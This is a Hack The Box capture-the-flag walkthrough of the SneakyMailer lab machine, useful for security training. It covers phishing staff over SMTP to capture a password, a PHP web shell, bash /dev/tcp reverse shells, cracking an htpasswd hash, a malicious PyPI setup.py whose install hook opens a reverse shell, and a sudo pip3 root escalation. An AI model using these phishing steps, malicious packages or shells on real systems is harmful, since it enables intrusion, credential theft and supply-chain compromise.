## Default Information
IP Address: 10.10.10.197\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.197    sneakymailer.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.197 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-04-18 10:44:44 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 25/tcp on 10.10.10.197                                    
Discovered open port 8080/tcp on 10.10.10.197                                  
Discovered open port 993/tcp on 10.10.10.197                                   
Discovered open port 22/tcp on 10.10.10.197                                    
Discovered open port 80/tcp on 10.10.10.197                                    
Discovered open port 143/tcp on 10.10.10.197
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 21  | ftp | vsftpd 3.0.3 | Open |
| 22  | ssh | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | Open |
| 25  | smtp | Postfix smtpd | Open |
| 80  | http | nginx 1.14.2 | Open |
| 143  | imap | Courier Imapd (released 2018) | Open |
| 993  | ssl/imap | Courier Imapd (released 2018) | Open |
| 8080  | http | 8080 | Open |

Looking at the output for port 80, we realize that the site is redirecting requests to http://sneakycorp.htb. 

```
|_http-title: Did not follow redirect to http://sneakycorp.htb
```

We will then add sneakycorp.htb to our /etc/hosts file 

```
10.10.10.197    sneakycorp.htb sneakymailer.htb
```

Apart from that, looking at the output for port 8080, it looks like a default website for Nginx server. This looks like the proxy gateway for port 80, which uses Nginx

```
8080/tcp open     http        syn-ack ttl 63 nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Welcome to nginx!
```

### Web Enumeration on port 80
Visiting http://sneakymailer.htb:80, we realize that we are being redirected to http://sneakycorp.htb.

Using gobuster to enumerate the endpoints on http://sneakycorp.htb, we were able to find several endpoints

```
http://sneakycorp.htb/css                  (Status: 301) [Size: 185] [--> http://sneakycorp.htb/css/]
http://sneakycorp.htb/js                   (Status: 301) [Size: 185] [--> http://sneakycorp.htb/js/]
http://sneakycorp.htb/img                  (Status: 301) [Size: 185] [--> http://sneakycorp.htb/img/]
http://sneakycorp.htb/index.php            (Status: 200) [Size: 13543]
http://sneakycorp.htb/team.php             (Status: 200) [Size: 26518]
http://sneakycorp.htb/vendor               (Status: 301) [Size: 185] [--> http://sneakycorp.htb/vendor/]
http://sneakycorp.htb/index.php            (Status: 200) [Size: 13543]
```

Apart from that, we were also able to find a subdomain (dev.sneakycorp.htb) using Gobuster's vhost enumeration

```
Found: dev.sneakycorp.htb (Status: 200) [Size: 13742]
```

We will then add dev.sneakycorp.htb onto the /etc/hosts file

```
10.10.10.197    sneakycorp.htb sneakymailer.htb dev.sneakycorp.htb
```

Visiting http://sneakcorp.htb/team.php, we are able to find a list of team members and their emails. We will then save the team members and extract the email addresses from here.
![List of team members](https://github.com/joelczk/writeups/blob/main/HTB/Images/SneakyMailer/emails.png)

### Web Enumeration of dev.sneakycorp.htb

Navigating to http://dev.sneakycorp.htb, we realize that there is a register button that might probably allow us to register a new user.
![Registering a new user](https://github.com/joelczk/writeups/blob/main/HTB/Images/SneakyMailer/register.png)

Afterwhich, we are redirected to http://dev.sneakycorp.htb/pypi/register.php, where we can register a new user.

![Register a new user](https://github.com/joelczk/writeups/blob/main/HTB/Images/SneakyMailer/register_user.png)

However, we are unable to logout of the current user and we are unable to find another endpoint that allows us to login to the user. This seems like a deadend for us.

### Web Enumeration on port 8080
Visiting http://sneakycorp.htb:8080, we are redirected to teh default page for nginx page. This seems like a deadend as well. 

![nginx default page](https://github.com/joelczk/writeups/blob/main/HTB/Images/SneakyMailer/nginx.png)

### FTP Enumeration
First, let us try to do anonymous login using FTP. Unfortunately, we are unable to do anonymous login using FTP

```
┌──(kali㉿kali)-[~/Desktop/sneakymailer]
└─$ ftp 10.10.10.197  
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:kali): anonymous
530 Permission denied.
Login failed.
ftp> 
```

Next, we will try to do a bruteforce attack on the FTP credentials using the FTP credential list from seclists. Unfortuantely, we are unable to find any valid credentials for the FTP service on port 21.

```
┌──(kali㉿kali)-[~/Desktop/sneakymailer]
└─$ hydra -v -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f 10.10.10.197 ftp
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
...
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-04-19 02:49:23
```

### SMTP Enumeration

Let us first check if the list of users that we have obtained earlier are valid email addresses on SMTP at port 25 using smtp-user-enum. From the output below, we can see that all the email addresses that we have obtained earlier are valid addresses as we are obtaining valid responses of 252 from all the email addresses.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/sneakymailer]
└─$ smtp-user-enum -U emails.txt 10.10.10.197 25                               
Connecting to 10.10.10.197 25 ...
220 debian ESMTP Postfix (Debian/GNU)
250 debian
Start enumerating users with VRFY mode ...
[----] airisatou@sneakymailer.htb          252 2.0.0 airisatou@sneakymailer.htb
[----] angelicaramos@sneakymailer.htb      252 2.0.0 angelicaramos@sneakymailer.htb
[----] ashtoncox@sneakymailer.htb          252 2.0.0 ashtoncox@sneakymailer.htb
[----] bradleygreer@sneakymailer.htb       252 2.0.0 bradleygreer@sneakymailer.htb
[----] brendenwagner@sneakymailer.htb      252 2.0.0 brendenwagner@sneakymailer.htb
[----] briellewilliamson@sneakymailer.htb  252 2.0.0 briellewilliamson@sneakymailer.htb
...
```

Since we have a list of email addresses and we have access to the SMTP server, we can craft a phishing email to send to all the users and check if any of the user returns any response that are of use to us. 

To do that, we will first need to modify our email address list such that the different email addresses are now seperated by commas instead of newlines. This can be achived by using ```cat emails.txt | tr '\n' ','```

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/sneakymailer]
└─$ cat emails.txt | tr '\n' ','
airisatou@sneakymailer.htb,angelicaramos@sneakymailer.htb,ashtoncox@sneakymailer.htb,bradleygreer@sneakymailer.htb,brendenwagner@sneakymailer.htb,briellewilliamson@sneakymailer.htb,brunonash@sneakymailer.htb,caesarvance@sneakymailer.htb,carastevens@sneakymailer.htb,cedrickelly@sneakymailer.htb,chardemarshall@sneakymailer.htb,colleenhurst@sneakymailer.htb,dairios@sneakymailer.htb,donnasnider@sneakymailer.htb,doriswilder@sneakymailer.htb,finncamacho@sneakymailer.htb,fionagreen@sneakymailer.htb,garrettwinters@sneakymailer.htb,gavincortez@sneakymailer.htb,gavinjoyce@sneakymailer.htb,glorialittle@sneakymailer.htb,haleykennedy@sneakymailer.htb,hermionebutler@sneakymailer.htb,herrodchandler@sneakymailer.htb,hopefuentes@sneakymailer.htb,howardhatfield@sneakymailer.htb,jacksonbradshaw@sneakymailer.htb,jenagaines@sneakymailer.htb,jenettecaldwell@sneakymailer.htb,jenniferacosta@sneakymailer.htb,jenniferchang@sneakymailer.htb,jonasalexander@sneakymailer.htb,laelgreer@sneakymailer.htb,martenamccray@sneakymailer.htb,michaelsilva@sneakymailer.htb,michellehouse@sneakymailer.htb,olivialiang@sneakymailer.htb,paulbyrd@sneakymailer.htb,prescottbartlett@sneakymailer.htb,quinnflynn@sneakymailer.htb,rhonadavidson@sneakymailer.htb,sakurayamamoto@sneakymailer.htb,sergebaldwin@sneakymailer.htb,shaddecker@sneakymailer.htb,shouitou@sneakymailer.htb,sonyafrost@sneakymailer.htb,sukiburks@sneakymailer.htb,sulcud@sneakymailer.htb,tatyanafitzpatrick@sneakymailer.htb,thorwalton@sneakymailer.htb,tigernixon@sneakymailer.htb,timothymooney@sneakymailer.htb,unitybutler@sneakymailer.htb,vivianharrell@sneakymailer.htb,yuriberry@sneakymailer.htb,zenaidafrank@sneakymailer.htb,zoritaserrano@sneakymailer.htb,  
```

Next, we will then use swaks to craft the phishing email to all the user. We will then need to setup a local server to receive the response from the phishing email. For this, we would need to use a ```nc``` command instead of ```python3 -m http.server``` as the SMTP server sends a POST request to the local server that we have set up. 

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/sneakymailer]
└─$ python3 -m http.server 3000
Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ...
10.10.10.197 - - [19/Apr/2022 09:36:44] code 501, message Unsupported method ('POST')
10.10.10.197 - - [19/Apr/2022 09:36:44] "POST / HTTP/1.1" 501 -
```

Now, we will then use swaks to craft a phshing email that is to be sent to all the email addresses. In the body of the email, we will include our local server so that anyone who clicks on the phishing link will then send their response to our local server.

```
──(kali㉿kali)-[~/Desktop/sneakymailer]
└─$ swaks --to $(cat emails.txt | tr '\n' ',') --from test@sneakymailer.htb --header "Phishing email" --body "http://10.10.16.4:4000" --server 10.10.10.197
=== Trying 10.10.10.197:25...
=== Connected to 10.10.10.197.
<-  220 debian ESMTP Postfix (Debian/GNU)
 -> EHLO kali
<-  250-debian
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<test@sneakymailer.htb>
<-  250 2.1.0 Ok
....
```

Lastly, we are able to receive a response on our local server. Looking at the body of the response that we received, we are able to obtain the credentials for Paul. Url decoding the response body, we are able to obtain the password as ```^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht```

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/sneakymailer]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.197] 51846
POST / HTTP/1.1
Host: 10.10.16.4:4000
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
```

Using the email that we have obtained, we will try to authenticate to the ftp server. However, we are unable to authenticate to the ftp server.

```
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:kali): paulbyrd@sneakymailer.htb
530 Permission denied.
Login failed.
ftp> 
```

### Imap Enumeration

Recalling that we have an IMAP service on port 143, let us try to use the credentials that we have obtained on the imap service. To do so, we will use claws mail. In claws mail, we will have to configure the mail to receive the emails from paulbyrd@sneakymailer.htb. To do that, we will then have to configuration > create new account.

![Claws Mail configuration](https://github.com/joelczk/writeups/blob/main/HTB/Images/SneakyMailer/claws_mail_config.png)

Looking at the sent mails, we are able to discover 2 mails sent by Paul. From these 2 mails, we are able to obtain another set of credentials and also, we are able to know that there is a PyPI service that is running for this machine.

![Obtaining sent mails from Claws Mail](https://github.com/joelczk/writeups/blob/main/HTB/Images/SneakyMailer/sent_mails.png)
## Exploit
### Exploiting FTP
Using the credentials that we have obtained from the sent mails, we are able to authenticate to the FTP server.

```
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:kali): developer
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Looking through the FTP server, we are able to find a dev directory and in the dev directory, we notice that it contains the files that are accessible from the websites that we have explored earlier.

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Jun 30  2020 dev
226 Directory send OK.
ftp> cd dev
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26  2020 css
drwxr-xr-x    2 0        0            4096 May 26  2020 img
-rwxr-xr-x    1 0        0           13742 Jun 23  2020 index.php
drwxr-xr-x    3 0        0            4096 May 26  2020 js
drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
drwxr-xr-x    4 0        0            4096 May 26  2020 scss
-rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
226 Directory send OK.
```

Next, what we can do is to create a php web shell and upload it onto the FTP server (NOTE: Since we can see that the webserver is coded in php, we shall use php webshell here)

```
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
31 bytes sent in 0.00 secs (540.5971 kB/s)
```

We then realize that we are unable to find the webshell at http://sneakycorp.htb/shell.php?cmd=id. Recalling that we have uploaded the webshell to the dev directory, we now try to access the webshell at http://dev.sneakycorp.htb/shell.php?cmd=id
![webshell](https://github.com/joelczk/writeups/blob/main/HTB/Images/SneakyMailer/webshell.png)

During the exploitation, we also realize that the server removes the uploaded webshell periodically so, we will have to continually upload the webshell. Next, we can then supply the cmd parameter with a reverse shell payload by visiting http://dev.sneakycorp.htb/shell.php?cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.4%2F4000%200%3E%261%27

![Reverse shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/SneakyMailer/reverse_shell.png)

### Privilege Escalation to low
Looking at the /home directory, we can find that there are 2 users in this machine, low and vmail. 

```
www-data@sneakymailer:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root  root  4096 May 14  2020 .
drwxr-xr-x 18 root  root  4096 May 14  2020 ..
drwxr-xr-x  8 low   low   4096 Jun  8  2020 low
drwx------  5 vmail vmail 4096 May 19  2020 vmail
```

We also realize that we can enter the directory belonging to low where we can find the user.txt file. However, we are unable to read the user.txt file. Hence, we would need to escalate our privileges to the low user.

```
www-data@sneakymailer:/home$ cd low
cd low
www-data@sneakymailer:/home/low$ ls -l
ls -l
total 8
-rwxr-x--- 1 root low   33 Apr 21 00:15 user.txt
drwxr-xr-x 6 low  low 4096 May 16  2020 venv
www-data@sneakymailer:/home/low$ cat user.txt 
cat user.txt
cat: user.txt: Permission denied
www-data@sneakymailer:/home/low$ 
```

Using linpeas, we realize that there is a process executing pypi-server that is running in the background owned by the user pypi

```
pypi       709  0.0  0.6  36808 26076 ?        Ss   00:14   0:20 /var/www/pypi.sneakycorp.htb/venv/bin/python3 /var/www/pypi.sneakycorp.htb/venv/bin/pypi-server -i 127.0.0.1 -p 5000 -a update,download,list -P /var/www/pypi.sneakycorp.htb/.htpasswd --disable-fallback -o /var/www/pypi.sneakycorp.htb/packages
```

Looking at the network information from Linpeas, we can also find that there is a host ```pypi.sneakycorp.htb``` that is running on the localhost at 127.0.0.1

```
╔══════════╣ Hostname, hosts and DNS
sneakymailer                                                                                                         
127.0.0.1       localhost pypi.sneakycorp.htb
```

However when we look at the active ports from Linpeas, we realize that the pypi.sneakycorp.htb is being proxied to port 8080 that is accessible from an external network.

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                             
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                                    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      766/nginx: worker p 
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      766/nginx: worker p 
```

Let us first add pypi.sneakycorp.htb onto our /etc/hosts file

```
10.10.10.197    pypi.sneakycorp.htb sneakymailer.htb sneakycorp.htb dev.sneakycorp.htb
```

When we try to access the list of python packages at http://pypi.sneakycorp.htb:8080, we also realize that we require a set of credentials to authenticate to the pypi server

![Authenticating to the pypi server](https://github.com/joelczk/writeups/blob/main/HTB/Images/SneakyMailer/pypi_auth.png)

Using linpeas, we are also able to discover a password hash in the .htpasswd file.

```
╔══════════╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root root 43 May 15  2020 /var/www/pypi.sneakycorp.htb/.htpasswd                                        
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```

Next, we will save the hash to a file and identify the type of hash using ```hashid```

```
┌──(kali㉿kali)-[~/Desktop/sneakymailer]
└─$ hashid '$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/'
Analyzing '$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/'
[+] MD5(APR) 
[+] Apache MD5 
```

Afterwards, we will use hashcat to try to crack the hash. From the output, we can obtain the password as ```soufianeelhaoui```

```
┌──(kali㉿kali)-[~/Desktop/sneakymailer]
└─$ hashcat -m 1600 hash.txt /home/kali/Desktop/pentest/wordlist/rockyou.txt --force
hashcat (v6.1.1) starting...
$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui
```

Using pypi:soufianeelhaoui, we are able to authenticate to http://pypi.sneakycorp.htb:8080/packages/, but we realize that we are unable to find any listed packages. We also recall from the email exchange that we have obtained earlier that all the python modules will be erased.

![List of python packages](https://github.com/joelczk/writeups/blob/main/HTB/Images/SneakyMailer/package_list.png)

Following the tutorial from [here](https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/), we will setup a python package on our local machine. However, we will modify the setup.py file to create a reverse shell.

```python
from setuptools import setup
from setuptools.command.install import install
import os

class Exploit(install):
    def run(self):
        os.system("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.4/3000 0>&1'")

setup(
    name='exploit',
    packages=['exploit'],
    description='Exploit',
    version='0.1',
    url='http://github.com/example/linode_example',
    author='Exploit',
    author_email='docs@linode.com',
    cmdclass={'install':Exploit},
    keywords=['pip','exploit','example']
    )
```

Afterwards, we will run the command to upload the malicious pypi package onto the pypi server

```
┌──(kali㉿kali)-[~]
└─$ python3 setup.py sdist upload -r exploit
exploit.egg-info/top_level.txt
writing dependency_links to exploit.egg-info/dependency_links.txt
reading manifest file 'exploit.egg-info/SOURCES.txt'
writing manifest file 'exploit.egg-info/SOURCES.txt'
running check
creating exploit-0.1
creating exploit-0.1/exploit
creating exploit-0.1/exploit.egg-info
copying files to exploit-0.1...
copying README.md -> exploit-0.1
copying setup.cfg -> exploit-0.1
copying setup.py -> exploit-0.1
copying exploit/__init__.py -> exploit-0.1/exploit
copying exploit.egg-info/PKG-INFO -> exploit-0.1/exploit.egg-info
copying exploit.egg-info/SOURCES.txt -> exploit-0.1/exploit.egg-info
copying exploit.egg-info/dependency_links.txt -> exploit-0.1/exploit.egg-info
copying exploit.egg-info/top_level.txt -> exploit-0.1/exploit.egg-info
Writing exploit-0.1/setup.cfg
Creating tar archive
removing 'exploit-0.1' (and everything under it)
running upload
Submitting dist/exploit-0.1.tar.gz to http://pypi.sneakycorp.htb:8080
Server response (200): OK
```

### Obtaining user flag
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000     
listening on [any] 3000 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.197] 56686
low@sneakymailer:/$ cat /home/low/user.txt
cat /home/low/user.txt
<Redacted user flag>
low@sneakymailer:/$ 
```

### Privilege Escalation to root
Using linpeas, we realize that the current user is able to execute pip3 commands with root privileges

```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                          
Matching Defaults entries for low on sneakymailer:                                                                   
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3
```

Using [GTFOBins](https://gtfobins.github.io/gtfobins/pip/), we are able to find a privilege escalation vector using pip3. 

![Privilege Escalation using pip3](https://github.com/joelczk/writeups/blob/main/HTB/Images/SneakyMailer/pip3_privilege_escalation.png)
### Obtaining root flag
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 2000     
listening on [any] 2000 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.197] 49178
root@sneakymailer:/tmp/pip-req-build-yfa8y78y# cat /root/root.txt
cat /root/root.txt
<Redacted root flag>
```
## Post-Exploitation
### pypi.sneakycorp.htb proxy
Looking at the configuration file at /etc/nginx/site-enabled/pypi.sneakycorp.htb, we are also able to see that the configuration sets port 8080 to be the proxy for pypi.sneakycorp.htb where the traffic from http://127.0.0.1:5000 will be redirected to http://pypi.sneakycorp.htb:8080

```
server {
        listen 0.0.0.0:8080 default_server;
        listen [::]:8080 default_server;
        server_name _;
}
server {
        listen 0.0.0.0:8080;
        listen [::]:8080;
        server_name pypi.sneakycorp.htb;
        location / {
                proxy_pass http://127.0.0.1:5000;
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
        }
}
```

### Creating malicious pypi package
The directory tree that was used for creating the pypi package is as follows:

```
exploit/
    exploit/
        __init__.py
    setup.py
    setup.cfg
    README.md
```

The README.md file and the exploit/exploit/__init__.py file can be kept empty.

The setup.cfg file lets pypi know that the README.md file is a markdown file. 

```                                                  
[metadata]
description-file = README.md
```

The setup.py file is required to contain the basic information about the pypi package. In this file, we can create a class that contains our exploit and we will then need to add a ```cmdclass``` to tell the pypi server that they should install the pypi package onto their server

```python
from setuptools import setup
from setuptools.command.install import install
import os

class Exploit(install):
    def run(self):
        os.system("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.4/3000 0>&1'")

setup(
    name='exploit',
    packages=['exploit'],
    description='Exploit',
    version='0.1',
    url='http://github.com/example/linode_example',
    author='Exploit',
    author_email='docs@linode.com',
    cmdclass={'install':Exploit},
    keywords=['pip','exploit','example']
    )

```

Last but not least, we should have a ~/.pypirc file as well. This file sets the configuration information for uploading the pypi package onto the server

```
[distutils]
index-servers =
  exploit
[exploit]
repository: http://pypi.sneakycorp.htb:8080
username:pypi
password: soufianeelhaoui
```

For this exploit, we are unable to exploit this vulnerability by doing a pip install of the pypii package as we would require a .pip directory and we do not have the permissions to create the directory.

Also, we realize that the pypi package is removed from the index very quickly. By the time we try to fetch the pypi package using pip install, the package would have been removed and the exploit might not be plausible.
```
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ mkdir .pip
mkdir .pip
mkdir: cannot create directory ‘.pip’: Permission denied
```

### Privilege Escalation by breaking out of restricted environment
Another way of escalating our privileges to root is by breaking out of the restricted environments by spawning an interactive system shell

```
low@sneakymailer:/$ TF=$(mktemp -d)
TF=$(mktemp -d)
low@sneakymailer:/$ echo "import os; os.execl('/bin/bash', 'bash', '-c', 'bash <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
echo "import os; os.execl('/bin/bash', 'bash', '-c', 'bash <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
low@sneakymailer:/$ sudo pip3 install $TF
sudo pip3 install $TF
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.eGtZCfqCey
root@sneakymailer:/tmp/pip-req-build-3kiddbs6# 
```
